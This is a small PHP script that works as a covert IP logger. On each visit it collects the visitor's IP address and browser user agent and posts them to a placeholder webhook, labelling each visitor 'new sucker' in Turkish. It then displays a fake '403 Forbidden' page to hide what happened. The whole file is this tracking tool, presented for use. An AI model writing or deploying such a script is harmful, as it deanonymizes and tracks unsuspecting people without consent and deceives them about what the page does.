<?php
$webhookurl = "WEBHOOK";

$ip_adresi = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];

$message = "Yeni Enayi\nIP: " . $ip_adresi . "\nUser Agent: " . $user_agent;

$hookData = json_encode([
    "content" => $message
]);

$ch = curl_init($webhookurl);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $hookData);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

$response = curl_exec($ch);
curl_close($ch);

if ($response === false) {
    echo "Sisteme baglanilamadi " . curl_error($ch);
} else {
    echo "403 Forbidden";
}
?>
